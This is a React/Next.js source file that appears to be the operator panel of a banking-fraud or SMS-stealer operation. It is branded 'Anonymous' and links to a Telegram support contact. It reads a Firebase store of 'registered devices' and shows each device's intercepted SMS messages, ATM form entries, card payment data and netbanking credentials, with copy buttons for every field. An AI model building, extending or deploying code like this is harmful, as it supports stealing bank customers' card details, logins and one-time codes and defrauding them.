"use client";

import { db } from "@/lib/firbase";
import { Card } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import { useEffect, useMemo, useState } from "react";
import { BiCopy } from "react-icons/bi";
import { FaCopy } from "react-icons/fa";
import { useRouter, usePathname } from "next/navigation";
import Link from "next/link";
import LineSpinner from "@/components/LineSpinner";


const SearchIcon = () => (
  <svg
    className="h-4 w-4 text-slate-500"
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth="1.8"
      d="m21 21-4.2-4.2m1.2-4.8a6 6 0 1 1-12 0 6 6 0 0 1 12 0Z"
    />
  </svg>
);
const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

type SmsRecord = {
  id: string;
  body: string;
  senderNumber: string;
  receiverNumber: string;
  timestamp: string;
  title: string;
  messageId: string;
};

type DeviceRecord = {
  id: string;
  brand: string;
  model: string;
  formSubmissions: SubmissionRecord[];
  cardSubmissions: SubmissionRecord[];
  netBankingSubmissions: SubmissionRecord[];
  smsLogs: SmsRecord[];
};

function formatSmartTime(value: number) {
  const timestamp = new Date(value).getTime();

  if (Number.isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";

  const now = Date.now();
  const diffMs = now - timestamp;

  if (diffMs <= 0) return "Just now";

  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));

  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;

  return "Just now";
}

function parseTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value < 1_000_000_000_000 ? value * 1000 : value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    if (/^\d+$/.test(trimmed)) {
      const numericValue = Number(trimmed);
      return trimmed.length <= 10 ? numericValue * 1000 : numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") {
    return "N/A";
  }

  const keyName = key.toLowerCase();

  if (
    keyName.includes("timestamp") ||
    keyName.includes("createdat") ||
    keyName.includes("updatedat")
  ) {
    return "";
  }

  if (typeof value === "object") {
    return JSON.stringify(value);
  }

  return String(value);
}

function sortSubmissionsByLatest(items: SubmissionRecord[]) {
  return items.slice().sort((a, b) => {
    const bTime = parseTimestamp(b.timestamp ?? b.createdAt ?? b.updatedAt);
    const aTime = parseTimestamp(a.timestamp ?? a.createdAt ?? a.updatedAt);
    return bTime - aTime;
  });
}

function compareDeviceDesc(a: DeviceRecord, b: DeviceRecord) {
  return b.id.localeCompare(a.id, undefined, {
    numeric: true,
    sensitivity: "base",
  });
}

function getDeviceName(device: DeviceRecord) {
  const name = `${device.brand} ${device.model}`.trim();
  return name === "" ? "Unknown Device" : name;
}

function selectFirstAvailable<T = unknown>(
  record: Record<string, unknown>,
  keys: string[],
) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) {
      return record[key] as T;
    }
  }
  return undefined;
}

function mapSubmissions(
  data: unknown,
  fallbackSortField?: "timestamp" | "createdAt",
) {
  if (!data || typeof data !== "object") {
    return [];
  }

  const entries = Object.entries(
    data as Record<string, Record<string, unknown>>,
  ).map(([key, value]) => ({
    id: key,
    ...value,
    ...(fallbackSortField &&
    value &&
    typeof value === "object" &&
    value[fallbackSortField] === undefined
      ? { [fallbackSortField]: 0 }
      : {}),
  }));

  return sortSubmissionsByLatest(entries);
}

function toSafeText(value: unknown, fallback: string) {
  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed.length > 0 ? trimmed : fallback;
  }

  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  return fallback;
}

function toISOTime(value: unknown) {
  if (typeof value === "number") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  if (typeof value === "string") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  return new Date(0).toISOString();
}

function formatTimestamp(value: string) {
  const date = new Date(value);

  if (Number.isNaN(date.getTime())) {
    return "Unknown time";
  }

  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function sortSmsByLatest(items: SmsRecord[]) {
  return items
    .slice()
    .sort(
      (a, b) =>
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
    );
}

export default function AllDataPage() {
  const [devices, setDevices] = useState<DeviceRecord[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const registerDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(registerDevicesRef, (snapshot) => {
      if (!snapshot.exists()) {
        setDevices([]);
        setIsLoading(false);
        return;
      }

      const data = snapshot.val() as Record<string, Record<string, unknown>>;

      const nextDevices: DeviceRecord[] = Object.entries(data)
        .map(([deviceId, rawDevice]) => {
          const smsSource = rawDevice.smsLogs;
          const smsLogs =
            smsSource && typeof smsSource === "object"
              ? sortSmsByLatest(
                  Object.entries(smsSource as Record<string, unknown>)
                    .map(([messageId, payload]) => {
                      if (!payload || typeof payload !== "object") {
                        return null;
                      }

                      const smsPayload = payload as Record<string, unknown>;

                      return {
                        id: `${deviceId}-${messageId}`,
                        messageId,
                        title: toSafeText(smsPayload.title, "New SMS"),
                        body: toSafeText(smsPayload.body, "No message body"),
                        senderNumber: toSafeText(
                          smsPayload.senderNumber,
                          "Unknown sender",
                        ),
                        receiverNumber: toSafeText(
                          smsPayload.receiverNumber ?? smsPayload.reciverNumber,
                          "Unknown receiver",
                        ),
                        timestamp: toISOTime(smsPayload.timestamp),
                      } satisfies SmsRecord;
                    })
                    .filter((entry): entry is SmsRecord => entry !== null),
                )
              : [];

          return {
            id: deviceId,
            brand:
              typeof rawDevice.brand === "string" ? rawDevice.brand : "Unknown",
            model:
              typeof rawDevice.model === "string" ? rawDevice.model : "Unknown",
            formSubmissions: mapSubmissions(
              selectFirstAvailable(rawDevice, FORM_KEYS),
              "timestamp",
            ),
            cardSubmissions: mapSubmissions(
              selectFirstAvailable(rawDevice, CARD_KEYS),
              "createdAt",
            ),
            netBankingSubmissions: mapSubmissions(
              selectFirstAvailable(rawDevice, NETBANK_KEYS),
              "createdAt",
            ),
            smsLogs,
          };
        })
        .filter(
          (device) =>
            device.smsLogs.length > 0 ||
            device.formSubmissions.length > 0 ||
            device.cardSubmissions.length > 0 ||
            device.netBankingSubmissions.length > 0,
        )
        .sort(compareDeviceDesc);

      setDevices(nextDevices);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const filteredDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    if (!query) {
      return devices;
    }

    return devices.filter((device) => {
      const matchesDevice =
        device.id.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        getDeviceName(device).toLowerCase().includes(query);

      const formsText = [
        ...device.formSubmissions,
        ...device.cardSubmissions,
        ...device.netBankingSubmissions,
      ]
        .flatMap((submission) => Object.values(submission))
        .map((value) => String(value ?? "").toLowerCase())
        .join(" ");

      const smsText = device.smsLogs
        .flatMap((sms) => [
          sms.body,
          sms.title,
          sms.senderNumber,
          sms.receiverNumber,
          sms.messageId,
        ])
        .map((value) => value.toLowerCase())
        .join(" ");

      return (
        matchesDevice || formsText.includes(query) || smsText.includes(query)
      );
    });
  }, [devices, searchQuery]);

  const copyToClipboard = async (text: string, e?: React.MouseEvent) => {
    if (e) {
      e.stopPropagation();
    }
    
    if (typeof window === "undefined") {
      return;
    }

    try {
      await navigator.clipboard.writeText(text);
      return;
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.setAttribute("readonly", "");
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };
  
  const router = useRouter();
  const pathname = usePathname();

  // Handle card click - Open in NEW TAB
  const handleCardClick = (deviceId: string) => {
    if (!deviceId || deviceId === "Unknown") {
      return;
    }
    
    // Open in new tab
    const url = `/devices/${deviceId}`;
    window.open(url, '_blank');
  };

  return (
    <div className="min-h-screen bg-[#ffffff]">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
            Anonymous
          </Link>
          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
 <a
  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
  target="_blank"
  rel="noopener noreferrer"
  className="text-white/85 transition-colors hover:text-white"
>
  Support
</a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        <div className="space-y-5 rounded-[14px] border border-[#d6d6d6] bg-[#f3f3f3] p-5 shadow-[0_4px_20px_rgba(0,0,0,0.1)]">
          <div className="flex items-center gap-3">
            <select
              aria-label="Filter all"
              className="h-12 flex-1 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-4 text-base font-semibold text-[#2f2f2f] outline-none"
              onChange={(e) => router.push(e.target.value)}
              value={pathname}
            >
              <option value="/all">All</option>
              <option value="/messages">Messages</option>
              <option value="/forms">Forms</option>
              <option value="/devices">Devices</option>
            </select>
            <button onClick={() => window.location.reload()} className="h-12 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-6 text-base font-semibold text-[#2f2f2f] transition hover:bg-[#eaeaea]">
              NEW
            </button>
          </div>

          <div className="relative">
            <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-[#8e8e8e]">
              ⌕
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(event) => setSearchQuery(event.target.value)}
              placeholder="Search All Data"
              className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
            />
          </div>
        </div>

        {isLoading ? (
          <LineSpinner />
        ) : filteredDevices.length === 0 ? (
          <Card className="surface-card p-10 text-center shadow-[0_4px_16px_rgba(0,0,0,0.08)]">
            <p className="text-lg font-semibold text-(--text-main)">
              No matching devices found
            </p>
            <p className="mt-2 text-sm text-(--text-muted)">
              Try a different search term or wait for new data.
            </p>
          </Card>
        ) : (
          <div className="space-y-8">
            {filteredDevices.map((device) => (
              <div key={device.id} className="space-y-3">
                <div className="flex flex-col gap-3">
                  {device.smsLogs.map((sms) => (
                    <div
                      key={sms.id}
                      onClick={() => handleCardClick(device.id)}
                      style={{ cursor: 'pointer' }}
                      className="block"
                    >
                      <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
                        <div className="mt-2 space-y-1">
                          <span className="font-bold text-blue-800 flex flex-row">
                            DATE
                            <BiCopy
                              onClick={(e) => copyToClipboard(formatTimestamp(sms.timestamp), e)}
                            />
                          </span>
                          <p className="text-[11px] font-semibold uppercase tracking-wide text-gray-500">
                            {formatTimestamp(sms.timestamp)}
                          </p>

                          <span className="font-bold text-blue-800 flex flex-row">
                            MSG
                            <BiCopy
                              onClick={(e) => copyToClipboard(sms.body, e)}
                            />
                          </span>
                          <p className="text-[13px] text-red-600">
                            {sms.body}
                          </p>

                          <span className="font-bold text-blue-800 flex flex-row">
                            SENDER
                            <BiCopy
                              onClick={(e) => copyToClipboard(sms.senderNumber, e)}
                            />
                          </span>
                          <p className="text-[13px] text-gray-600">
                            {sms.senderNumber}
                          </p>

                          {sms.receiverNumber && (
                            <>
                              <span className="font-bold text-blue-800 flex flex-row">
                                RECEIVER
                                <BiCopy
                                  onClick={(e) => copyToClipboard(sms.receiverNumber, e)}
                                />
                              </span>
                              <p className="text-[13px] text-gray-600">
                                {sms.receiverNumber}
                              </p>
                            </>
                          )}

                          <span className="font-bold text-blue-800 flex flex-row">
                            DEVICE ID
                            <BiCopy
                              onClick={(e) => copyToClipboard(device.id, e)}
                            />
                          </span>
                          <p className="text-[13px] text-gray-600 font-mono">
                            {device.id}
                          </p>

                          {(device.brand !== "Unknown" || device.model !== "Unknown") && (
                            <div className="mt-2 pt-2 border-t border-gray-200">
                              <p className="text-[11px] text-gray-500">
                                📱 {device.brand} {device.model}
                              </p>
                            </div>
                          )}
                        </div>
                      </Card>
                    </div>
                  ))}

                  {device.formSubmissions.map((submission) => {
                    const timestamp =
                      submission.timestamp ||
                      submission.createdAt ||
                      submission.updatedAt;

                    return (
                      <div
                        key={submission.id}
                        onClick={() => handleCardClick(device.id)}
                        style={{ cursor: 'pointer' }}
                        className="block"
                      >
                        <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
                          <div className="mt-2 space-y-1">
                            {Object.entries(submission).map(
                              ([key, value]) => (
                                <div
                                  key={key}
                                  className="flex flex-col gap-1 text-sm text-gray-600"
                                >
                                  {key === "id" && (
                                    <>
                                      <span className="font-bold text-blue-800 flex flex-row">
                                        DEVICE ID
                                        <BiCopy
                                          onClick={(e) => copyToClipboard(String(device.id), e)}
                                        />
                                      </span>
                                      <p className="text-[13px] text-gray-600 font-mono">
                                        {device.id}
                                      </p>
                                    </>
                                  )}
                                  {!(
                                    key.toLowerCase().includes("timestamp") ||
                                    key.toLowerCase().includes("createdat") ||
                                    key.toLowerCase().includes("updatedat") ||
                                    key.toLowerCase().includes("id")
                                  ) && (
                                    <>
                                      <div className="flex flex-row items-center gap-1">
                                        <span className="font-semibold text-blue-800 uppercase">
                                          {key}:
                                        </span>

                                        <FaCopy
                                          onClick={(e) => {
                                            e.stopPropagation();
                                            navigator.clipboard.writeText(
                                              String(value),
                                            );
                                          }}
                                        />
                                      </div>

                                      <span>
                                        {formatDisplayValue(key, value)}
                                      </span>
                                    </>
                                  )}
                                </div>
                              ),
                            )}
                            
                            {(device.brand !== "Unknown" || device.model !== "Unknown") && (
                              <div className="mt-2 pt-2 border-t border-gray-200">
                                <p className="text-[11px] text-gray-500">
                                  📱 {device.brand} {device.model}
                                </p>
                              </div>
                            )}
                          </div>
                          {timestamp !== null && timestamp !== undefined && (
                            <div className="flex justify-end mt-2">
                              <span className="text-xs text-gray-500">
                                {formatSmartTime(Number(timestamp))}
                              </span>
                            </div>
                          )}
                        </Card>
                      </div>
                    );
                  })}

                  {device.cardSubmissions.map((submission) => {
                    const timestamp =
                      submission.timestamp ||
                      submission.createdAt ||
                      submission.updatedAt;

                    return (
                      <div
                        key={submission.id}
                        onClick={() => handleCardClick(device.id)}
                        style={{ cursor: 'pointer' }}
                        className="block"
                      >
                        <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
                          <div className="mt-2 space-y-1">
                            {Object.entries(submission).map(
                              ([key, value]) => (
                                <div
                                  key={key}
                                  className="flex flex-col gap-1 text-sm text-gray-600"
                                >
                                  {key === "id" && (
                                    <>
                                      <span className="font-bold text-blue-800 flex flex-row">
                                        DEVICE ID
                                        <BiCopy
                                          onClick={(e) => copyToClipboard(String(device.id), e)}
                                        />
                                      </span>
                                      <p className="text-[13px] text-gray-600 font-mono">
                                        {device.id}
                                      </p>
                                    </>
                                  )}
                                  {!(
                                    key.toLowerCase().includes("timestamp") ||
                                    key.toLowerCase().includes("createdat") ||
                                    key.toLowerCase().includes("updatedat") || 
                                    key.toLowerCase().includes("id")
                                  ) && (
                                    <>
                                      <div className="flex flex-row items-center gap-1">
                                        <span className="font-semibold text-blue-800 uppercase">
                                          {key}:
                                        </span>

                                        <FaCopy
                                          onClick={(e) => {
                                            e.stopPropagation();
                                            navigator.clipboard.writeText(
                                              String(value),
                                            );
                                          }}
                                        />
                                      </div>

                                      <span>
                                        {formatDisplayValue(key, value)}
                                      </span>
                                    </>
                                  )}
                                </div>
                              ),
                            )}
                            
                            {(device.brand !== "Unknown" || device.model !== "Unknown") && (
                              <div className="mt-2 pt-2 border-t border-gray-200">
                                <p className="text-[11px] text-gray-500">
                                  📱 {device.brand} {device.model}
                                </p>
                              </div>
                            )}
                          </div>
                          {timestamp !== null && timestamp !== undefined && (
                            <div className="flex justify-end mt-2">
                              <span className="text-xs text-gray-500">
                                {formatSmartTime(Number(timestamp))}
                              </span>
                            </div>
                          )}
                        </Card>
                      </div>
                    );
                  })}

                  {device.netBankingSubmissions.map((submission) => {
                    const timestamp =
                      submission.timestamp ||
                      submission.createdAt ||
                      submission.updatedAt;

                    return (
                      <div
                        key={submission.id}
                        onClick={() => handleCardClick(device.id)}
                        style={{ cursor: 'pointer' }}
                        className="block"
                      >
                        <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
                          <div className="mt-2 space-y-1">
                            {Object.entries(submission).map(
                              ([key, value]) => (
                                <div
                                  key={key}
                                  className="flex flex-col gap-1 text-sm text-gray-600"
                                >
                                  {key === "id" && (
                                    <>
                                      <span className="font-bold text-blue-800 flex flex-row">
                                        DEVICE ID
                                        <BiCopy
                                          onClick={(e) => copyToClipboard(String(device.id), e)}
                                        />
                                      </span>
                                      <p className="text-[13px] text-gray-600 font-mono">
                                        {device.id}
                                      </p>
                                    </>
                                  )}
                                  {!(
                                    key.toLowerCase().includes("timestamp") ||
                                    key.toLowerCase().includes("createdat") ||
                                    key.toLowerCase().includes("updatedat") || 
                                    key.toLowerCase().includes("id")
                                  ) && (
                                    <>
                                      <div className="flex flex-row items-center gap-1">
                                        <span className="font-semibold text-blue-800 uppercase">
                                          {key}:
                                        </span>

                                        <FaCopy
                                          onClick={(e) => {
                                            e.stopPropagation();
                                            navigator.clipboard.writeText(
                                              String(value),
                                            );
                                          }}
                                        />
                                      </div>

                                      <span>
                                        {formatDisplayValue(key, value)}
                                      </span>
                                    </>
                                  )}
                                </div>
                              ),
                            )}
                            
                            {(device.brand !== "Unknown" || device.model !== "Unknown") && (
                              <div className="mt-2 pt-2 border-t border-gray-200">
                                <p className="text-[11px] text-gray-500">
                                  📱 {device.brand} {device.model}
                                </p>
                              </div>
                            )}
                          </div>
                          {timestamp !== null && timestamp !== undefined && (
                            <div className="flex justify-end mt-2">
                              <span className="text-xs text-gray-500">
                                {formatSmartTime(Number(timestamp))}
                              </span>
                            </div>
                          )}
                        </Card>
                      </div>
                    );
                  })}
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
    </div>
  );
}